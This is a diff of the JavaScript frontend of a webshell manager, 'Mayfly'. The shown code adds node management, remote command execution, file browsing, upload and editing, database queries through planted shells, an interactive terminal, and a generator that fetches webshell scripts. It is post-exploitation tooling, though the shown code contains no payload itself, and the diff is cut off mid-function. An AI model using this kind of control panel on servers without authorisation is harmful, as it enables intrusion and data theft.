@@ -1,494 +1,689 @@
-// ===== Mayfly WebShell 前端应用 =====
+// ===== Mayfly WebShell 管理器前端 =====
 
-// 全局状态
 const state = {
     token: localStorage.getItem('mayfly_token'),
     user: localStorage.getItem('mayfly_user') || 'admin',
-    terminals: [],   // { id, name, term, fitAddon, ws, active }
-    activeId: null,
-    termCounter: 0,
-    settings: {
-        fontSize: 14,
-        theme: 'dark',
-        cursorBlink: true,
-    },
+    nodes: [],
+    currentNode: null,
+    currentTab: 'cmd',
+    filePath: '',
+    editingFile: null,
+    terms: {},
+    activeTermId: null,
 };
 
-// 主题配置
-const themes = {
-    dark: {
-        background: '#0d1117',
-        foreground: '#e6edf3',
-        cursor: '#e6edf3',
-        selectionBackground: 'rgba(99, 102, 241, 0.3)',
-        black: '#484f58',
-        red: '#ff7b72',
-        green: '#3fb950',
-        yellow: '#d29922',
-        blue: '#58a6ff',
-        magenta: '#bc8cff',
-        cyan: '#39c5cf',
-        white: '#b1bac4',
-        brightBlack: '#6e7681',
-        brightRed: '#ffa198',
-        brightGreen: '#56d364',
-        brightYellow: '#e3b341',
-        brightBlue: '#79c0ff',
-        brightMagenta: '#d2a8ff',
-        brightCyan: '#56d4dd',
-        brightWhite: '#f0f6fc',
-    },
-    light: {
-        background: '#ffffff',
-        foreground: '#24292f',
-        cursor: '#24292f',
-        selectionBackground: 'rgba(99, 102, 241, 0.2)',
-        black: '#24292f',
-        red: '#cf222e',
-        green: '#1a7f37',
-        yellow: '#9a6700',
-        blue: '#0969da',
-        magenta: '#8250df',
-        cyan: '#1b7c83',
-        white: '#57606a',
-        brightBlack: '#6e7681',
-        brightRed: '#a40e26',
-        brightGreen: '#2da44e',
-        brightYellow: '#bf8700',
-        brightBlue: '#218bff',
-        brightMagenta: '#a475f9',
-        brightCyan: '#3192aa',
-        brightWhite: '#8c959f',
-    },
-    solarized: {
-        background: '#002b36',
-        foreground: '#839496',
-        cursor: '#93a1a1',
-        selectionBackground: 'rgba(131, 148, 150, 0.3)',
-        black: '#073642',
-        red: '#dc322f',
-        green: '#859900',
-        yellow: '#b58900',
-        blue: '#268bd2',
-        magenta: '#d33682',
-        cyan: '#2aa198',
-        white: '#eee8d5',
-        brightBlack: '#002b36',
-        brightRed: '#cb4b16',
-        brightGreen: '#586e75',
-        brightYellow: '#657b83',
-        brightBlue: '#839496',
-        brightMagenta: '#6c71c4',
-        brightCyan: '#93a1a1',
-        brightWhite: '#fdf6e3',
-    },
-};
-
-// ===== 初始化 =====
-async function init() {
-    // 检查认证
-    if (!state.token) {
-        window.location.href = '/login';
-        return;
+// ===== 工具函数 =====
+function api(method, path, body) {
+    const headers = { 'Authorization': 'Bearer ' + state.token };
+    const opts = { method, headers };
+    if (body !== undefined) {
+        headers['Content-Type'] = 'application/json';
+        opts.body = JSON.stringify(body);
     }
-
-    // 校验 token 有效性，避免过期 token 导致无限重连
-    const valid = await validateToken();
-    if (!valid) {
-        localStorage.removeItem('mayfly_token');
-        localStorage.removeItem('mayfly_user');
-        window.location.href = '/login';
-        return;
-    }
-
-    // 显示用户名
-    document.getElementById('currentUser').textContent = state.user;
-
-    // 加载设置
-    loadSettings();
-
-    // 绑定事件
-    bindEvents();
-
-    // 自动创建第一个终端
-    createTerminal();
-
-    // 加载系统信息
-    loadSysInfo();
-    setInterval(loadSysInfo, 30000);
+    return fetch('/api' + path, opts).then(async (res) => {
+        if (res.status === 401) { logout(true); throw new Error('登录已过期'); }
+        const data = await res.json().catch(() => ({}));
+        return { ok: res.ok, status: res.status, data };
+    });
 }
 
-// 校验 token 是否有效（通过受保护的 API 探测）
-async function validateToken() {
+function toast(msg, type) {
+    let wrap = document.getElementById('toastWrap');
+    if (!wrap) { wrap = document.createElement('div'); wrap.id = 'toastWrap'; document.body.appendChild(wrap); }
+    const t = document.createElement('div');
+    t.className = 'toast ' + (type || 'info');
+    t.textContent = msg;
+    wrap.appendChild(t);
+    setTimeout(() => t.classList.add('show'), 10);
+    setTimeout(() => { t.classList.remove('show'); setTimeout(() => t.remove(), 300); }, 2600);
+}
+
+function logout(expired) {
+    localStorage.removeItem('mayfly_token');
+    localStorage.removeItem('mayfly_user');
+    if (expired) alert('登录已过期，请重新登录');
+    window.location.href = '/login';
+}
+
+function fmtSize(n) {
+    if (n == null) return '-';
+    if (n < 1024) return n + ' B';
+    if (n < 1024 * 1024) return (n / 1024).toFixed(1) + ' KB';
+    if (n < 1024 * 1024 * 1024) return (n / 1024 / 1024).toFixed(1) + ' MB';
+    return (n / 1024 / 1024 / 1024).toFixed(2) + ' GB';
+}
+
+function fmtTime(ts) {
+    if (!ts) return '-';
+    const d = new Date(ts * 1000);
+    const p = (n) => String(n).padStart(2, '0');
+    return `${d.getFullYear()}-${p(d.getMonth() + 1)}-${p(d.getDate())} ${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
+}
+
+function joinPath(dir, name) {
+    if (!dir) return name;
+    if (dir.includes('\\')) return dir.replace(/\\+$/, '') + '\\' + name;
+    return dir.replace(/\/+$/, '') + '/' + name;
+}
+
+function dirOf(path) {
+    if (!path) return path;
+    if (path.includes('\\')) {
+        const p = path.replace(/\\+$/, '');
+        const i = p.lastIndexOf('\\');
+        return i > 1 ? p.slice(0, i) : p.slice(0, 1) + '\\';
+    }
+    const p = path.replace(/\/+$/, '');
+    const i = p.lastIndexOf('/');
+    if (i <= 0) return '/';
+    return p.slice(0, i);
+}
+
+function arrayBufferToBase64(buf) {
+    let binary = '';
+    const bytes = new Uint8Array(buf);
+    const chunk = 0x8000;
+    for (let i = 0; i < bytes.length; i += chunk) {
+        binary += String.fromCharCode.apply(null, bytes.subarray(i, i + chunk));
+    }
+    return btoa(binary);
+}
+
+function base64ToBytes(b64) {
+    const bin = atob(b64);
+    const bytes = new Uint8Array(bin.length);
+    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
+    return bytes;
+}
+
+function escapeHtml(s) {
+    return String(s).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
+}
+
+function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+function openModal(id) { document.getElementById(id).style.display = 'flex'; }
+
+function promptModal(title, placeholder, val) {
+    return new Promise((resolve) => {
+        document.getElementById('promptTitle').textContent = title;
+        const input = document.getElementById('promptInput');
+        input.placeholder = placeholder || '';
+        input.value = val || '';
+        openModal('promptModal');
+        input.focus();
+        const ok = () => {
+            const v = input.value;
+            closeModal('promptModal');
+            document.getElementById('promptOkBtn').onclick = null;
+            resolve(v);
+        };
+        document.getElementById('promptOkBtn').onclick = ok;
+        input.onkeydown = (e) => { if (e.key === 'Enter') ok(); };
+    });
+}
+
+// ===== 节点管理 =====
+async function loadNodes() {
+    const r = await api('GET', '/nodes');
+    state.nodes = r.data.nodes || [];
+    renderNodeList();
+}
+
+function renderNodeList() {
+    const list = document.getElementById('nodeList');
+    list.innerHTML = '';
+    if (state.nodes.length === 0) {
+        list.innerHTML = '<div class="empty-tip">暂无节点<br>点击右上角 + 添加</div>';
+        return;
+    }
+    state.nodes.forEach((n) => {
+        const item = document.createElement('div');
+        item.className = 'node-item' + (state.currentNode && state.currentNode.id === n.id ? ' active' : '');
+        const dot = document.createElement('span');
+        dot.className = 'node-type-badge type-' + n.type;
+        dot.textContent = n.type.toUpperCase();
+        const nameDiv = document.createElement('div');
+        nameDiv.className = 'node-item-name';
+        nameDiv.textContent = n.name;
+        const urlDiv = document.createElement('div');
+        urlDiv.className = 'node-item-url';
+        urlDiv.textContent = n.url;
+        const textWrap = document.createElement('div');
+        textWrap.className = 'node-item-text';
+        textWrap.appendChild(nameDiv);
+        textWrap.appendChild(urlDiv);
+        item.appendChild(dot);
+        item.appendChild(textWrap);
+        item.onclick = () => selectNode(n);
+        list.appendChild(item);
+    });
+}
+
+function selectNode(node) {
+    state.currentNode = node;
+    state.filePath = '';
+    state.editingFile = null;
+    document.getElementById('fileEditor').style.display = 'none';
+    document.getElementById('currentNodeTitle').innerHTML =
+        '<span class="type-badge type-' + node.type + '">' + node.type.toUpperCase() + '</span> ' + escapeHtml(node.name);
+    renderNodeList();
+    updatePanelsForNode();
+}
+
+function updatePanelsForNode() {
+    if (state.currentTab === 'file') loadFiles('');
+    else if (state.currentTab === 'cmd') document.getElementById('cmdOutput').textContent = '';
+    else if (state.currentTab === 'terminal') ensureTerminal();
+    else if (state.currentTab === 'db') {
+        document.getElementById('dbResultTable').style.display = 'none';
+        document.getElementById('dbResultMsg').textContent = '';
+    }
+}
+
+let editingNodeId = null;
+function showNodeModal(node) {
+    editingNodeId = node ? node.id : null;
+    document.getElementById('nodeModalTitle').textContent = node ? '编辑节点' : '添加节点';
+    document.getElementById('nodeName').value = node ? node.name : '';
+    document.getElementById('nodeURL').value = node ? node.url : '';
+    document.getElementById('nodeType').value = node ? node.type : 'php';
+    document.getElementById('nodePass').value = node ? node.pass : '';
+    document.getElementById('nodeRemark').value = node ? node.remark : '';
+    openModal('nodeModal');
+}
+
+async function saveNode() {
+    const body = {
+        name: document.getElementById('nodeName').value.trim(),
+        url: document.getElementById('nodeURL').value.trim(),
+        type: document.getElementById('nodeType').value,
+        pass: document.getElementById('nodePass').value.trim() || 'mayfly',
+        remark: document.getElementById('nodeRemark').value.trim(),
+    };
+    if (!body.name || !body.url) { toast('名称和 URL 不能为空', 'error'); return; }
+    let r;
+    if (editingNodeId) r = await api('PUT', '/nodes/' + editingNodeId, body);
+    else r = await api('POST', '/nodes', body);
+    if (r.data.error) { toast(r.data.error, 'error'); return; }
+    closeModal('nodeModal');
+    await loadNodes();
+    toast(editingNodeId ? '已更新' : '已添加', 'success');
+    if (editingNodeId && state.currentNode && state.currentNode.id === editingNodeId) {
+        state.currentNode = r.data.node;
+        document.getElementById('currentNodeTitle').innerHTML =
+            '<span class="type-badge type-' + r.data.node.type + '">' + r.data.node.type.toUpperCase() + '</span> ' + escapeHtml(r.data.node.name);
+    }
+}
+
+async function deleteNode() {
+    const n = state.currentNode;
+    if (!n) { toast('请先选择节点', 'error'); return; }
+    if (!confirm('确定删除节点「' + n.name + '」？')) return;
+    const r = await api('DELETE', '/nodes/' + n.id);
+    if (r.data.error) { toast(r.data.error, 'error'); return; }
+    if (state.terms[n.id]) destroyTerminal(n.id);
+    state.currentNode = null;
+    document.getElementById('currentNodeTitle').innerHTML = '<span class="muted">未选择节点</span>';
+    await loadNodes();
+    toast('已删除', 'success');
+}
+
+async function testNode() {
+    const n = state.currentNode;
+    if (!n) { toast('请先选择节点', 'error'); return; }
+    toast('正在测试...', 'info');
+    const r = await api('POST', '/nodes/' + n.id + '/test', {});
+    if (r.data.ok) {
+        toast('连接成功', 'success');
+        document.getElementById('cmdOutput').textContent = r.data.info || '';
+    } else {
+        toast('连接失败: ' + r.data.message, 'error');
+    }
+}
+
+// ===== 标签页 =====
+function switchTab(tab) {
+    state.currentTab = tab;
+    document.querySelectorAll('.tab').forEach((t) => t.classList.toggle('active', t.dataset.tab === tab));
+    document.querySelectorAll('.tab-panel').forEach((p) => p.classList.remove('active'));
+    document.getElementById('panel-' + tab).classList.add('active');
+    updatePanelsForNode();
+    if (tab === 'terminal') ensureTerminal();
+}
+
+// ===== 命令执行 =====
+async function runCmd() {
+    const n = state.currentNode;
+    if (!n) { toast('请先选择节点', 'error'); return; }
+    const input = document.getElementById('cmdInput');
+    const cmd = input.value.trim();
+    if (!cmd) return;
+    const out = document.getElementById('cmdOutput');
+    out.textContent += '\n> ' + cmd + '\n';
+    const r = await api('POST', '/nodes/' + n.id + '/cmd', { cmd });
+    if (r.data.error) {
+        out.textContent += '[错误] ' + r.data.error + '\n';
+    } else {
+        out.textContent += r.data.output || '(无输出)';
+        if (r.data.output && !r.data.output.endsWith('\n')) out.textContent += '\n';
+    }
+    out.scrollTop = out.scrollHeight;
+    input.value = '';
+    input.focus();
+}
+
+// ===== 文件管理 =====
+async function loadFiles(path) {
+    const n = state.currentNode;
+    if (!n) { toast('请先选择节点', 'error'); return; }
+    const r = await api('POST', '/nodes/' + n.id + '/file/list', { path: path || '' });
+    if (r.data.error) { toast(r.data.error, 'error'); return; }
+    state.filePath = r.data.path;
+    document.getElementById('filePath').value = state.filePath;
+    state.fileParent = r.data.parent || '';
+    renderFileTable(r.data.entries || []);
+}
+
+function renderFileTable(entries) {
+    const tbody = document.getElementById('fileTableBody');
+    tbody.innerHTML = '';
+    entries.forEach((e) => {
+        const tr = document.createElement('tr');
+        const icon = e.type === 'd' ? '<i class="fas fa-folder folder-icon"></i>' : '<i class="fas fa-file file-icon"></i>';
+        const nameTd = document.createElement('td');
+        nameTd.innerHTML = icon + ' ' + escapeHtml(e.name);
+        nameTd.className = 'file-name';
+        nameTd.onclick = () => {
+            if (e.type === 'd') {
+                const target = e.name === '..' ? (state.fileParent || dirOf(state.filePath)) : joinPath(state.filePath, e.name);
+                loadFiles(target);
+            } else {
+                openFile(e.name);
+            }
+        };
+        tr.appendChild(nameTd);
+        const typeTd = document.createElement('td');
+        typeTd.textContent = e.type === 'd' ? '目录' : '文件';
+        tr.appendChild(typeTd);
+        const sizeTd = document.createElement('td');
+        sizeTd.textContent = e.type === 'd' ? '-' : fmtSize(e.size);
+        tr.appendChild(sizeTd);
+        const timeTd = document.createElement('td');
+        timeTd.textContent = fmtTime(e.mtime);
+        tr.appendChild(timeTd);
+        const opTd = document.createElement('td');
+        opTd.className = 'op-cell';
+        if (e.type === 'f') {
+            opTd.appendChild(miniBtn('编辑', () => openFile(e.name)));
+            opTd.appendChild(miniBtn('下载', () => downloadFile(e.name)));
+        }
+        opTd.appendChild(miniBtn('重命名', () => renameEntry(e.name)));
+        opTd.appendChild(miniBtn('删除', () => deleteEntry(e.name), true));
+        tr.appendChild(opTd);
+        tbody.appendChild(tr);
+    });
+}
+
+function miniBtn(text, onClick, danger) {
+    const b = document.createElement('button');
+    b.className = 'mini-btn' + (danger ? ' danger' : '');
+    b.textContent = text;
+    b.onclick = (e) => { e.stopPropagation(); onClick(); };
+    return b;
+}
+
+async function openFile(name) {
+    const n = state.currentNode;
+    const path = joinPath(state.filePath, name);
+    const r = await api('POST', '/nodes/' + n.id + '/file/read', { path });
+    if (r.data.error) { toast(r.data.error, 'error'); return; }
+    state.editingFile = { path, base64: r.data.content };
+    document.getElementById('fileEditor').style.display = 'flex';
+    document.getElementById('fileEditorPath').textContent = path;
     try {
-        const res = await fetch('/api/sessions', {
-            headers: { 'Authorization': 'Bearer ' + state.token },
-        });
-        // 401 表示 token 无效或过期
-        return res.status !== 401;
+        const text = new TextDecoder('utf-8', { fatal: false }).decode(base64ToBytes(r.data.content));
+        document.getElementById('fileEditorContent').value = text;
     } catch (e) {
-        // 网络异常时返回 true，交给 WebSocket 自动重连机制兜底
-        return true;
+        document.getElementById('fileEditorContent').value = '';
+        toast('二进制文件，无法直接编辑，可下载', 'info');
     }
 }
 
-// ===== 终端管理 =====
-function createTerminal() {
-    state.termCounter++;
-    const termId = 'term-' + state.termCounter;
-    const termName = '终端 ' + state.termCounter;
+async function saveFile() {
+    if (!state.editingFile) return;
+    const text = document.getElementById('fileEditorContent').value;
+    const b64 = btoa(unescape(encodeURIComponent(text)));
+    const r = await api('POST', '/nodes/' + state.currentNode.id + '/file/write', { path: state.editingFile.path, content: b64 });
+    if (r.data.error) { toast(r.data.error, 'error'); return; }
+    toast('保存成功', 'success');
+}
 
-    // 创建终端 DOM
+async function downloadFile(name) {
+    const n = state.currentNode;
+    const path = joinPath(state.filePath, name);
+    const r = await api('POST', '/nodes/' + n.id + '/file/read', { path });
+    if (r.data.error) { toast(r.data.error, 'error'); return; }
+    const blob = new Blob([base64ToBytes(r.data.content)]);
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = name;
+    a.click();
+    URL.revokeObjectURL(a.href);
+}
+
+async function renameEntry(name) {
+    const newName = await promptModal('重命名', '输入新名称', name);
+    if (!newName || newName === name) return;
+    const path = joinPath(state.filePath, name);
+    const newPath = joinPath(state.filePath, newName);
+    const r = await api('POST', '/nodes/' + state.currentNode.id + '/file/rename', { path, newPath });
+    if (r.data.error) { toast(r.data.error, 'error'); return; }
+    loadFiles(state.filePath);
+}
+
+async function deleteEntry(name) {
+    if (!confirm('确定删除「' + name + '」？')) return;
+    const path = joinPath(state.filePath, name);
+    const r = await api('POST', '/nodes/' + state.currentNode.id + '/file/delete', { path });
+    if (r.data.error) { toast(r.data.error, 'error'); return; }
+    loadFiles(state.filePath);
+}
+
+async function mkdirFile() {
+    const name = await promptModal('新建目录', '输入目录名');
+    if (!name) return;
+    const path = joinPath(state.filePath, name);
+    const r = await api('POST', '/nodes/' + state.currentNode.id + '/file/mkdir', { path });
+    if (r.data.error) { toast(r.data.error, 'error'); return; }
+    loadFiles(state.filePath);
+}
+
+async function uploadFiles() {
+    const input = document.getElementById('fileUploadInput');
+    const files = input.files;
+    if (!files.length) return;
+    for (const f of files) {
+        const buf = await f.arrayBuffer();
+        const b64 = arrayBufferToBase64(buf);
+        const path = joinPath(state.filePath, f.name);
+        const r = await api('POST', '/nodes/' + state.currentNode.id + '/file/write', { path, content: b64 });
+        if (r.data.error) toast('上传 ' + f.name + ' 失败: ' + r.data.error, 'error');
+        else toast('上传 ' + f.name + ' 成功', 'success');
+    }
+    input.value = '';
+    loadFiles(state.filePath);
+}
+
+// ===== 数据库 =====
+async function runDb() {
+    const n = state.currentNode;
+    if (!n) { toast('请先选择节点', 'error'); return; }
+    const sql = document.getElementById('dbSql').value.trim();
+    if (!sql) { toast('SQL 不能为空', 'error'); return; }
+    const r = await api('POST', '/nodes/' + n.id + '/db', {
+        dbType: document.getElementById('dbType').value,
+        host: document.getElementById('dbHost').value,
+        port: document.getElementById('dbPort').value,
+        user: document.getElementById('dbUser').value,
+        pass: document.getElementById('dbPass').value,
+        name: document.getElementById('dbName').value,
+        sql,
+    });
+    const msgEl = document.getElementById('dbResultMsg');
+    const table = document.getElementById('dbResultTable');
+    if (r.data.error) {
+        msgEl.textContent = r.data.error;
+        msgEl.className = 'db-result-msg error';
+        table.style.display = 'none';
+        return;
+    }
+    renderDbResult(r.data.result || '');
+}
+
+function renderDbResult(text) {
+    const msgEl = document.getElementById('dbResultMsg');
+    const table = document.getElementById('dbResultTable');
+    const lines = text.replace(/\r/g, '').split('\n').filter((l) => l.length > 0);
+    if (lines.length === 0) {
+        msgEl.textContent = '执行成功（无返回结果）';
+        msgEl.className = 'db-result-msg success';
+        table.style.display = 'none';
+        return;
+    }
+    const cols = lines[0].split('\t');
+    const rows = lines.slice(1).map((l) => l.split('\t'));
+    let html = '<thead><tr>' + cols.map((c) => '<th>' + escapeHtml(c) + '</th>').join('') + '</tr></thead><tbody>';
+    rows.forEach((row) => {
+        html += '<tr>' + cols.map((_, i) => '<td>' + escapeHtml(row[i] !== undefined ? row[i] : 'NULL') + '</td>').join('') + '</tr>';
+    });
+    html += '</tbody>';
+    table.innerHTML = html;
+    table.style.display = 'table';
+    msgEl.textContent = '共 ' + rows.length + ' 行';
+    msgEl.className = 'db-result-msg success';
+}
+
+// ===== 虚拟终端 =====
+function ensureTerminal() {
+    const n = state.currentNode;
+    if (!n) { toast('请先选择节点', 'error'); return; }
+    const container = document.getElementById('terminalContainer');
+    if (!container._ready) {
+        container.innerHTML = '';
+        container._ready = true;
+    }
+    const existing = state.terms[n.id];
+    if (existing) {
+        document.querySelectorAll('.terminal-instance').forEach((el) => el.classList.remove('active'));
+        const div = document.getElementById('term-' + n.id);
+        if (div) div.classList.add('active');
+        state.activeTermId = n.id;
+        setTimeout(() => existing.fitAddon.fit(), 30);
+        return;
+    }
+    createTerminal(n);
+}
+
+function createTerminal(node) {
     const container = document.getElementById('terminalContainer');
     const div = document.createElement('div');
-    div.className = 'terminal-instance';
-    div.id = termId;
+    div.id = 'term-' + node.id;
+    div.className = 'terminal-instance active';
     container.appendChild(div);
 
-    // 创建 xterm 实例
     const term = new Terminal({
-        fontSize: state.settings.fontSize,
-        fontFamily: 'Menlo, Monaco, "DejaVu Sans Mono", Consolas, monospace',
-        theme: themes[state.settings.theme],
-        cursorBlink: state.settings.cursorBlink,
-        allowProposedApi: true,
+        fontSize: 14,
+        fontFamily: 'Menlo, Monaco, Consolas, monospace',
+        cursorBlink: true,
+        theme: {
+            background: '#0d1117', foreground: '#e6edf3', cursor: '#e6edf3',
+            black: '#484f58', red: '#ff7b72', green: '#3fb950', yellow: '#d29922',
+            blue: '#58a6ff', magenta: '#bc8cff', cyan: '#39c5cf', white: '#b1bac4',
+            brightBlack: '#6e7681', brightRed: '#ffa198', brightGreen: '#56d364',
+            brightYellow: '#e3b341', brightBlue: '#79c0ff', brightMagenta: '#d2a8ff',
+            brightCyan: '#56d4dd', brightWhite: '#f0f6fc',
+        },
         scrollback: 10000,
     });
-
     const fitAddon = new FitAddon.FitAddon();
-    const webLinksAddon = new WebLinksAddon.WebLinksAddon();
     term.loadAddon(fitAddon);
-    term.loadAddon(webLinksAddon);
     term.open(div);
+    setTimeout(() => fitAddon.fit(), 30);
 
-    // 延迟一帧后 fit
-    requestAnimationFrame(() => {
-        fitAddon.fit();
-    });
+    const termData = { term, fitAddon, ws: null, buf: '' };
+    state.terms[node.id] = termData;
+    state.activeTermId = node.id;
 
-    // 终端会话数据
-    const termData = {
-        id: termId,
-        name: termName,
-        term: term,
-        fitAddon: fitAddon,
-        ws: null,
-        active: false,
-        reconnect: true,       // 是否自动重连
-        reconnectAttempts: 0,  // 重连次数
-        reconnectTimer: null,  // 重连定时器
-    };
-
-    state.terminals.push(termData);
-
-    // 终端输入 -> WebSocket
-    term.onData((data) => {
-        if (termData.ws && termData.ws.readyState === WebSocket.OPEN) {
-            termData.ws.send(JSON.stringify({ type: 'input', data: data }));
-        }
-    });
-
-    // 终端大小变化 -> 发送 resize
-    term.onResize(({ cols, rows }) => {
-        if (termData.ws && termData.ws.readyState === WebSocket.OPEN) {
-            termData.ws.send(JSON.stringify({ type: 'resize', data: { cols, rows } }));
-        }
-    });
-
-    // 建立 WebSocket 连接
-    connectWS(termData);
-
-    // 切换到新终端
-    switchTerminal(termId);
-
-    // 监听容器大小变化
-    const resizeObserver = new ResizeObserver(() => {
-        if (termData.active) {
-            fitAddon.fit();
-        }
-    });
-    resizeObserver.observe(div);
+    let suppress = false;
+    term.onData((data) => handleTermInput(node.id, data));
+    connectTermWS(node.id);
+    return termData;
 }
 
-// 建立 WebSocket 连接（含自动重连）
-function connectWS(termData) {
+function connectTermWS(nodeId) {
+    const termData = state.terms[nodeId];
+    if (!termData) return;
     const wsUrl = (location.protocol === 'https:' ? 'wss://' : 'ws://') +
-        location.host + '/api/terminal?token=' + encodeURIComponent(state.token);
+        location.host + '/api/nodes/' + nodeId + '/terminal?token=' + encodeURIComponent(state.token);
     const ws = new WebSocket(wsUrl);
     termData.ws = ws;
-
-    ws.onopen = () => {
-        termData.reconnectAttempts = 0;
-        if (termData.term) {
-            termData.term.write('\x1b[32m[已连接]\x1b[0m\r\n');
-        }
-        sendResize(termData);
-        updateTerminalList();
-    };
-
-    ws.onmessage = (event) => {
-        if (!termData.term) return;
+    ws.onopen = () => { termData.term.write('\x1b[32m[已连接]\x1b[0m\r\n'); };
+    ws.onmessage = (e) => {
         try {
-            const msg = JSON.parse(event.data);
-            switch (msg.type) {
-                case 'output':
-                    termData.term.write(msg.data);
-                    break;
-                case 'closed':
-                    termData.term.write('\r\n\x1b[33m[终端已关闭]\x1b[0m\r\n');
-                    break;
-                case 'error':
-                    termData.term.write('\r\n\x1b[31m[错误] ' + msg.data + '\x1b[0m\r\n');
-                    break;
+            const msg = JSON.parse(e.data);
+            if (msg.type === 'output') {
+                termData.term.write(String(msg.data).replace(/\n/g, '\r\n'));
             }
-        } catch (e) {
-            termData.term.write(event.data);
-        }
+        } catch (err) { /* ignore */ }
     };
-
-    ws.onerror = () => {
-        // onerror 之后必然触发 onclose，统一在 onclose 中处理，避免重复提示
-    };
-
     ws.onclose = () => {
-        updateTerminalList();
-        if (termData.reconnect && termData.term) {
-            // 重连前校验 token，若已失效则跳转登录页，避免无限 401 循环
-            validateToken().then((valid) => {
-                if (!valid) {
-                    localStorage.removeItem('mayfly_token');
-                    localStorage.removeItem('mayfly_user');
-                    window.location.href = '/login';
-                    return;
-                }
-                // 指数退避重连，最大 30 秒
-                const delay = Math.min(2000 * Math.pow(2, termData.reconnectAttempts), 30000);
-                termData.reconnectAttempts++;
-                if (termData.term) {
-                    termData.term.write('\r\n\x1b[33m[连接已断开，' + Math.round(delay / 1000) + ' 秒后自动重连...]\x1b[0m\r\n');
-                }
-                termData.reconnectTimer = setTimeout(() => connectWS(termData), delay);
-            });
-        }
+        if (state.terms[nodeId]) termData.term.write('\x1b[33m\r\n[连接已断开]\x1b[0m\r\n');
     };
 }
 
-function switchTerminal(termId) {
-    state.terminals.forEach((t) => {
-        const el = document.getElementById(t.id);
-        if (t.id === termId) {
-            t.active = true;
-            el.classList.add('active');
-            document.getElementById('toolbarTitle').textContent = t.name;
-            requestAnimationFrame(() => {
-                t.fitAddon.fit();
-                t.term.focus();
-            });
+function handleTermInput(nodeId, data) {
+    const termData = state.terms[nodeId];
+    if (!termData || !termData.ws || termData.ws.readyState !== WebSocket.OPEN) return;
+    const term = termData.term;
+    for (const ch of data) {
+        if (ch === '\r') {
+            term.write('\r\n');
+            const line = termData.buf;
+            termData.buf = '';
+            termData.ws.send(JSON.stringify({ type: 'input', data: line }));
+        } else if (ch === '\n') {
+            // 已由 \r 处理，忽略
+        } else if (ch === '\x7f' || ch === '\b') {
+            if (termData.buf.length > 0) {
+                termData.buf = termData.buf.slice(0, -1);
+                term.write('\b \b');
+            }
         } else {
-            t.active = false;
-            el.classList.remove('active');
-        }
-    });
-    state.activeId = termId;
-    updateTerminalList();
-}
-
-function closeTerminal(termId) {
-    const idx = state.terminals.findIndex((t) => t.id === termId);
-    if (idx === -1) return;
-
-    const termData = state.terminals[idx];
-    // 停止自动重连
-    termData.reconnect = false;
-    if (termData.reconnectTimer) {
-        clearTimeout(termData.reconnectTimer);
-        termData.reconnectTimer = null;
-    }
-    if (termData.ws) {
-        termData.ws.close();
-    }
-    if (termData.term) {
-        termData.term.dispose();
-        termData.term = null;
-    }
-
-    document.getElementById(termId).remove();
-    state.terminals.splice(idx, 1);
-
-    if (state.activeId === termId) {
-        if (state.terminals.length > 0) {
-            switchTerminal(state.terminals[0].id);
-        } else {
-            state.activeId = null;
-            document.getElementById('toolbarTitle').textContent = '';
+            termData.buf += ch;
+            term.write(ch);
         }
     }
-    updateTerminalList();
 }
 
-function updateTerminalList() {
-    const list = document.getElementById('terminalList');
-    list.innerHTML = '';
-
-    state.terminals.forEach((t) => {
-        const tab = document.createElement('div');
-        tab.className = 'terminal-tab' + (t.active ? ' active' : '');
-
-        const dot = document.createElement('span');
-        dot.className = 'status-dot' + (t.ws && t.ws.readyState === WebSocket.OPEN ? '' : ' inactive');
-
-        const name = document.createElement('span');
-        name.className = 'tab-name';
-        name.textContent = t.name;
-
-        const closeBtn = document.createElement('button');
-        closeBtn.className = 'tab-close';
-        closeBtn.innerHTML = '<i class="fas fa-times"></i>';
-        closeBtn.onclick = (e) => {
-            e.stopPropagation();
-            closeTerminal(t.id);
-        };
-
-        tab.appendChild(dot);
-        tab.appendChild(name);
-        tab.appendChild(closeBtn);
-        tab.onclick = () => switchTerminal(t.id);
-
-        list.appendChild(tab);
-    });
+function destroyTerminal(nodeId) {
+    const t = state.terms[nodeId];
+    if (!t) return;
+    if (t.ws) t.ws.close();
+    if (t.term) t.term.dispose();
+    delete state.terms[nodeId];
+    const div = document.getElementById('term-' + nodeId);
+    if (div) div.remove();
+    if (state.activeTermId === nodeId) state.activeTermId = null;
 }
 
-function sendResize(termData) {
-    if (termData.ws && termData.ws.readyState === WebSocket.OPEN) {
-        const cols = termData.term.cols;
-        const rows = termData.term.rows;
-        termData.ws.send(JSON.stringify({ type: 'resize', data: { cols, rows } }));
-    }
+// ===== 脚本生成器 =====
+async function genScript() {
+    const type = document.getElementById('scriptType').value;
+    const pass = document.getElementById('scriptPass').value.trim();
+    const q = pass ? '?password=' + encodeURIComponent(pass) : '';
+    const r = await api('GET', '/scripts/' + type + q);
+    if (r.data.error) { toast(r.data.error, 'error'); return; }
+    document.getElementById('scriptContent').value = r.data.content;
 }
 
-// ===== 系统信息 =====
-function loadSysInfo() {
-    // 占位：后续可通过专用 API 获取系统信息
-    const hostname = document.getElementById('hostname');
-    const cpuInfo = document.getElementById('cpuInfo');
-    const memInfo = document.getElementById('memInfo');
-    const uptime = document.getElementById('uptime');
-
-    hostname.textContent = 'Ubuntu Server';
-    cpuInfo.textContent = '-';
-    memInfo.textContent = '-';
-    uptime.textContent = '-';
+function copyScript() {
+    const el = document.getElementById('scriptContent');
+    if (!el.value) { toast('请先生成脚本', 'info'); return; }
+    navigator.clipboard.writeText(el.value).then(() => toast('已复制', 'success'))
+        .catch(() => { el.select(); document.execCommand('copy'); toast('已复制', 'success'); });
 }
 
-// ===== 设置 =====
-function loadSettings() {
-    const saved = localStorage.getItem('mayfly_settings');
-    if (saved) {
-        try {
-            state.settings = { ...state.settings, ...JSON.parse(saved) };
-        } catch (e) {}
-    }
-}
-
-function saveSettings() {
-    localStorage.setItem('mayfly_settings', JSON.stringify(state.settings));
-}
-
-function applySettings() {
-    state.terminals.forEach((t) => {
-        t.term.options.fontSize = state.settings.fontSize;
-        t.term.options.theme = themes[state.settings.theme];
-        t.term.options.cursorBlink = state.settings.cursorBlink;
-        t.fitAddon.fit();
-    });
+function downloadScript() {
+    const el = document.getElementById('scriptContent');
+    if (!el.value) { toast('请先生成脚本', 'info'); return; }
